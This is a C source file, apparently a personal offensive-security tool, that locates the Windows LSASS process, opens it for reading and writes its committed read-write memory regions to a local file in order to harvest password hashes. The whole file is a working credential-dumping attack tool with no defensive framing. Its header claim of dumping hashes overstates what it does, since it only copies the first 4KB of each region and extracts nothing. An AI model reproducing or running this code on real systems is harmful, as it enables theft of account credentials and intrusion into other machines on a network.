/*
* Author: Aleksa Zatezalo
* Date: Februrary 2024
* Description: LSASS is a C program that dumps password hashes from LSASSs. 
*/

/* gcc lsass_dump.c -o lsass_dump.exe -lDbghelp */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>

#define DUMP_FILE "lsass_dump.bin"
#define READ_SIZE 4096  // Read in 4KB chunks

// Function to get LSASS process ID
DWORD GetLsassPID() {
    HANDLE snapshot;
    PROCESSENTRY32 pe;
    DWORD lsassPID = 0;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create process snapshot. Error: %d\n", GetLastError());
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                lsassPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return lsassPID;
}

// Function to dump LSASS memory using ReadProcessMemory()
void DumpLsassMemory() {
    DWORD lsassPID = GetLsassPID();
    if (lsassPID == 0) {
        printf("[!] Could not find LSASS process.\n");
        return;
    }
    printf("[+] LSASS PID: %d\n", lsassPID);

    HANDLE lsassProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPID);
    if (!lsassProcess) {
        printf("[!] Failed to open LSASS process. Error: %d\n", GetLastError());
        return;
    }
    printf("[+] Opened LSASS process successfully.\n");

    FILE *dumpFile = fopen(DUMP_FILE, "wb");
    if (!dumpFile) {
        printf("[!] Could not create dump file.\n");
        CloseHandle(lsassProcess);
        return;
    }
    printf("[+] Created dump file: %s\n", DUMP_FILE);

    MEMORY_BASIC_INFORMATION mbi;
    BYTE buffer[READ_SIZE];
    SIZE_T bytesRead;
    LPVOID addr = 0;

    while (VirtualQueryEx(lsassProcess, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) {
            if (ReadProcessMemory(lsassProcess, mbi.BaseAddress, buffer, READ_SIZE, &bytesRead)) {
                fwrite(buffer, 1, bytesRead, dumpFile);
            }
        }
        addr = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    fclose(dumpFile);
    CloseHandle(lsassProcess);
    printf("[+] LSASS memory dumped successfully!\n");
}

int main() {
    printf("[*] Starting LSASS memory dump...\n");
    DumpLsassMemory();
    return 0;
}